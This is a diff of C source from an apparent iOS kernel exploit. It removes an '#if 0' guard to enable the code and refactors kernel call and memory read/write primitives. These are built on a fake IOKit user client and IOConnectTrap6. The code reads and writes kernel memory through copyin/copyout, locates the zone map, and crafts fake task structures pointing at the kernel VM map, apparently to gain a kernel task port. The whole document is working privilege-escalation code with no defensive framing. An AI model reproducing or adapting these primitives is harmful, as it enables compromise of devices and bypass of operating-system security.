@@ -3,7 +3,6 @@
 #include <stddef.h>
 #include <stdbool.h>
 
-#if 0
 typedef uint64_t kptr_t;
 typedef int kern_return_t;
 typedef uint32_t mach_port_t;
@@ -174,7 +173,7 @@ typedef struct
 } mach_msg_data_buffer_t;
 
 //#define LOG(str, args...) do { } while(0)
-#define LOG(str, args...) do {offsets->userland_funcs->write(1,str,1024,)} while(0)
+#define LOG(str, args...) do {offsets->userland_funcs.write(1,str,1024);offsets->userland_funcs.write(1,"\n\n\n\n",4);} while(0)
 #define KERN_INVALID_ARGUMENT 2
 #define KERN_FAILURE 1
 #define KERN_SUCCESS 0
@@ -205,96 +204,100 @@ typedef struct
 #define MACH_MSGH_BITS(remote, local) ((remote) | ((local) << 8))
 
 
-uint64_t send_buffer_to_kernel_and_find(offsets_t *  offs, uint64_t (^read64)(uint64_t addr), uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size);
+uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets,void * fake_client,uint64_t kslide, mach_port_t the_one, uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size);
+
+#define spelunk(addr) ((zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff))
+#define zonemap_fix_addr(addr) (spelunk(addr) < zm_hdr.start ? spelunk(addr) + 0x100000000 : spelunk(addr))
+
+uint64_t kcall_raw(offsets_t * offsets,void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr, int n_args, ...)
+{
+	kern_return_t ret;
+    if (n_args > 7)
+    {
+        LOG("no more than 7 args you cheeky fuck");
+        return KERN_INVALID_ARGUMENT;
+    }
+
+    va_list ap;
+    va_start(ap, n_args);
+
+    uint64_t args[7] = { 0 };
+    for (int i = 0; i < n_args; i++)
+    {
+        args[i] = va_arg(ap, uint64_t);
+    }
+
+    // first arg must always have a value
+    if (n_args == 0 ||
+        args[0] == 0x0)
+    {
+        args[0] = 0x1;
+    }
+
+    *(uint64_t *)(fake_client + 0x40) = args[0];
+    *(uint64_t *)(fake_client + 0x48) = addr + kslide;
+
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to write to kdata buffer! ret: %x", ret);
+        return 0x0;
+    }
+
+    return offsets->userland_funcs.IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
+}
+#define kcall(addr,n_args, ...) kcall_raw(offsets,fake_client,kslide,the_one,addr,n_args,##__VA_ARGS__)
+
+void kreadbuf_raw(offsets_t * offsets,void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr, void *buf, size_t len)
+{
+    kcall(offsets->funcs.copyout, 3, addr, buf, len);
+}
+
+#define kreadbuf(addr,buf,len) kreadbuf_raw(offsets,fake_client,kslide,the_one,addr,buf,len)
+
+
+uint32_t kread32_raw(offsets_t * offsets,void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr)
+{
+    uint32_t val = 0;
+    kreadbuf(addr, &val, sizeof(val));
+    return val;
+}
+#define kread32(addr) kread32_raw(offsets,fake_client,kslide,the_one,addr)
+
+uint64_t kread64_raw(offsets_t * offsets, void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr)
+{
+    uint64_t val = 0;
+    kreadbuf(addr, &val, sizeof(val));
+    return val;
+}
+#define kread64(addr) kread64_raw(offsets,fake_client,kslide,the_one,addr)
+
+
+void kwritebuf_raw(offsets_t * offsets,void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr, void *buf, size_t len)
+{
+    kcall(offsets->funcs.copyin, 3, buf, addr, len);
+}
+#define kwritebuf(addr,buf,len) kwritebuf_raw(offsets,fake_client,kslide,the_one,addr,buf,len)
+
+
+void kwrite32_raw(offsets_t * offsets, void * fake_client, uint64_t kslide,mach_port_name_t the_one, uint64_t addr, uint32_t val)
+{
+    kwritebuf(addr, &val, sizeof(val));
+}
+#define kwrite32(addr,val) kwrite32_raw(offsets,fake_client,kslide,the_one,addr,val)
+
+
+void kwrite64_raw(offsets_t * offsets, void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr, uint64_t val)
+{
+    kwritebuf(addr, &val, sizeof(val));
+}
+#define kwrite64(addr,val) kwrite64_raw(offsets,fake_client,kslide,the_one,addr,val)
 
 void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobject_client_port_addr,uint64_t our_task_addr,uint64_t kslide,uint64_t the_one,offsets_t * offsets) {
     mach_port_array_t maps = NULL;
     mach_msg_type_number_t maps_num = 0;
 	kern_return_t ret;
-	kern_return_t (^kcall)(uint64_t, int, ...);
-	uint64_t (^zonemap_fix_addr)(uint64_t);
-
-	void (^kreadbuf)(uint64_t, void *, size_t) ;
-	void (^kwritebuf)(uint64_t, void *, size_t);
-
-	uint32_t (^kread32)(uint64_t);
-	uint64_t (^kread64)(uint64_t);
-
-	void (^kwrite32)(uint64_t, uint32_t);
-	void (^kwrite64)(uint64_t, uint64_t);
-	kcall = ^(uint64_t addr, int n_args, ...)
-    {
-        if (n_args > 7)
-        {
-            LOG("no more than 7 args you cheeky fuck");
-            return KERN_INVALID_ARGUMENT;
-        }
-
-        va_list ap;
-        va_start(ap, n_args);
-
-        uint64_t args[7] = { 0 };
-        for (int i = 0; i < n_args; i++)
-        {
-            args[i] = va_arg(ap, uint64_t);
-        }
-
-        // first arg must always have a value
-        if (n_args == 0 ||
-            args[0] == 0x0)
-        {
-            args[0] = 0x1;
-        }
-
-        *(uint64_t *)(fake_client + 0x40) = args[0];
-        *(uint64_t *)(fake_client + 0x48) = addr + kslide;
-
-        if (ret != KERN_SUCCESS)
-        {
-            LOG("failed to write to kdata buffer! ret: %x", ret);
-            return 0x0;
-        }
-
-        return offsets->userland_funcs.IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
-    };
-
-    /*  once we have an execution primitive we can use copyin/copyout funcs to freely read/write kernel mem  */
-
-    kreadbuf = ^(uint64_t addr, void *buf, size_t len)
-    {
-        kcall(offsets->funcs.copyout, 3, addr, buf, len);
-    };
-
-    kread32 = ^(uint64_t addr)
-    {
-        uint32_t val = 0;
-        kreadbuf(addr, &val, sizeof(val));
-        return val;
-    };
-	
-	kread64 = ^(uint64_t addr)
-    {
-        uint64_t val = 0;
-        kreadbuf(addr, &val, sizeof(val));
-        return val;
-    };
-
-    kwritebuf = ^(uint64_t addr, void *buf, size_t len)
-    {
-        kcall(offsets->funcs.copyin, 3, buf, addr, len);
-    };
-
-    kwrite32 = ^(uint64_t addr, uint32_t val)
-    {
-        kwritebuf(addr, &val, sizeof(val));
-    };
-
-    kwrite64 = ^(uint64_t addr, uint64_t val)
-    {
-        kwritebuf(addr, &val, sizeof(val));
-    };
-
     uint64_t zone_map_addr = kread64(offsets->data.zone_map + kslide);
+
     if (zone_map_addr == 0x0)
     {
         LOG("failed to get zone map addr");
@@ -383,14 +386,14 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
 
     size_t ktask_size = offsets->struct_offsets.sizeof_task;
 
-	char scratch_space[2048];
-	if (ktask_size > 1024) {
+	volatile char scratch_space[4096];
+	if (ktask_size > 2048) {
 		LOG("Buffer to small");
 		ret = KERN_FAILURE;
 		goto out;
 	}
     mach_msg_data_buffer_t * zm_task_buf_msg = (mach_msg_data_buffer_t *)&scratch_space;
-    for (int i = 0; i < ktask_size; i++) {
+    for (int i = 0; i < 4096; i++) {
 		scratch_space[i] = 0x0;
 	}
 
@@ -405,12 +408,12 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
     *(kptr_t *)((uint64_t)zm_task_buf + offsets->struct_offsets.task_itk_self) = 1;
     zm_task_buf->a.map = zone_map_addr;
 
-	mach_msg_data_buffer_t * km_task_buf_msg = (mach_msg_data_buffer_t *)(((uint64_t)&scratch_space) + 1024);
+	mach_msg_data_buffer_t * km_task_buf_msg = (mach_msg_data_buffer_t *)(((uint64_t)&scratch_space) + 2048);
 	ktask_t *km_task_buf = (ktask_t *)(&km_task_buf_msg->data[0]);
     km_task_buf->a.map = kernel_vm_map;
 
     // send both messages into kernel and grab the buffer addresses
-    uint64_t zm_task_buf_addr = send_buffer_to_kernel_and_find(offsets, kread64, our_task_addr, zm_task_buf_msg, ktask_size);
+    uint64_t zm_task_buf_addr = send_buffer_to_kernel_and_find(offsets, fake_client,kslide,the_one, our_task_addr, zm_task_buf_msg, ktask_size);
     if (zm_task_buf_addr == 0x0)
     {
         LOG("failed to get zm_task_buf_addr!");
@@ -419,7 +422,7 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
 
     LOG("zm_task_buf_addr: %llx", zm_task_buf_addr);
 
-    uint64_t km_task_buf_addr = send_buffer_to_kernel_and_find(offsets, kread64, our_task_addr, km_task_buf_msg, ktask_size);
+    uint64_t km_task_buf_addr = send_buffer_to_kernel_and_find(offsets, fake_client,kslide,the_one, our_task_addr, km_task_buf_msg, ktask_size);
     if (km_task_buf_addr == 0x0)
     {
         LOG("failed to get km_task_buf_addr!");
@@ -540,7 +543,7 @@ out:
 }
 
 // kinda messy function signature
-uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets, uint64_t (^read64)(uint64_t addr), uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
+uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets,void * fake_client,uint64_t kslide, mach_port_t the_one, uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
 {
     kern_return_t ret;
 
@@ -581,7 +584,7 @@ uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets, uint64_t (^read64)(
         goto err;
     }
 
-    uint64_t itk_registered = read64(our_task_addr + offsets->struct_offsets.itk_registered);
+    uint64_t itk_registered = kread64(our_task_addr + offsets->struct_offsets.itk_registered);
     if (itk_registered == 0x0)
     {
         LOG("failed to read our_task_addr->itk_registered!");
@@ -590,7 +593,7 @@ uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets, uint64_t (^read64)(
 
     LOG("itk_registered: %llx", itk_registered);
 
-    uint16_t msg_count = read64(itk_registered + offsetof(kport_t, ip_messages.port.msgcount)) & 0xffff;
+    uint16_t msg_count = kread64(itk_registered + offsetof(kport_t, ip_messages.port.msgcount)) & 0xffff;
     if (msg_count != 1)
     {
         LOG("got weird msgcount! expected 1 but got: %x", msg_count);
@@ -598,7 +601,7 @@ uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets, uint64_t (^read64)(
     }
 
     LOG("msg_count: %d", msg_count);
-    uint64_t messages = read64(itk_registered + offsetof(kport_t, ip_messages.port.messages));
+    uint64_t messages = kread64(itk_registered + offsetof(kport_t, ip_messages.port.messages));
     if (messages == 0x0)
     {
         LOG("unable to find ip_messages.port.messages in kernel port!");
@@ -607,7 +610,7 @@ uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets, uint64_t (^read64)(
 
     LOG("messages: %llx", messages);
 
-    uint64_t header = read64(messages + 0x18); // ipc_kmsg->ikm_header
+    uint64_t header = kread64(messages + 0x18); // ipc_kmsg->ikm_header
     if (header == 0x0)
     {
         LOG("unable to find ipc_kmsg->ikm_header");
@@ -620,7 +623,7 @@ uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets, uint64_t (^read64)(
 
     LOG("key_address: %llx", key_address);
 
-    uint64_t kernel_key = read64(key_address);
+    uint64_t kernel_key = kread64(key_address);
     if (kernel_key != buffer_msg->verification_key)
     {
         LOG("kernel verification key did not match! found wrong kmsg? expected: %llx, got: %llx", buffer_msg->verification_key, kernel_key);
@@ -639,4 +642,3 @@ uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets, uint64_t (^read64)(
 err:
     return 0x0;
 }
-#endif
